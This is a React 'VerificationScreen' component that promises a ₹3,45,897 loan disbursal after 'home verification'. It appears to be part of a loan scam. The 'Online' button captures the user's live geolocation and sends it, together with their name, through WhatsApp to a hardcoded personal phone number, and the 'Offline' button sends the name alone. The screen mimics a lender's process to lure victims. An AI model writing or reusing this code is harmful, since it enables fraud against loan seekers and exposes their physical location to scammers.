import { MapPin, MessageSquare, ShieldCheck } from 'lucide-react';

export default function VerificationScreen({ data }) {
  const phone = "918679357107";

  const handleOnline = () => {
    navigator.geolocation.getCurrentPosition((pos) => {
      const { latitude, longitude } = pos.coords;
      const msg = `Hi my name is ${data.name} and i need to Compelete Home Verification Online. Location: https://www.google.com/maps?q=${latitude},${longitude}`;
      window.open(`https://wa.me/${phone}?text=${encodeURIComponent(msg)}`, '_blank');
    });
  };

  const handleOffline = () => {
    const msg = `Hi my name is ${data.name} and i need to Compelete Home Verification Offline.`;
    window.open(`https://wa.me/${phone}?text=${encodeURIComponent(msg)}`, '_blank');
  };

  return (
    <div className="flex-1 p-8 pt-16 flex flex-col">
      <div className="text-center mb-12">
        <div className="inline-flex p-5 bg-green-50 rounded-full mb-6">
          <ShieldCheck className="w-10 h-10 text-green-600" />
        </div>
        <h2 className="text-3xl font-black text-slate-900 mb-2">Almost Done!</h2>
        <p className="text-slate-500">Complete home verification to disburse ₹3,45,897 to your account[cite: 19].</p>
      </div>

      <div className="space-y-4">
        <button onClick={handleOnline} className="w-full p-6 bg-white border-2 border-indigo-50 rounded-3xl text-left flex items-center gap-4 hover:border-indigo-600 shadow-sm transition-all">
          <div className="p-3 bg-indigo-50 rounded-2xl text-indigo-600"><MapPin /></div>
          <div><h4 className="font-bold">Online Home Verification</h4><p className="text-xs text-slate-400">Share live location via WhatsApp</p></div>
        </button>

        <button onClick={handleOffline} className="w-full p-6 bg-white border-2 border-slate-50 rounded-3xl text-left flex items-center gap-4 hover:border-slate-800 shadow-sm transition-all">
          <div className="p-3 bg-slate-50 rounded-2xl text-slate-600"><MessageSquare /></div>
          <div><h4 className="font-bold">WhatsApp Verification</h4><p className="text-xs text-slate-400">Manual verification with agent</p></div>
        </button>
      </div>
    </div>
  );
}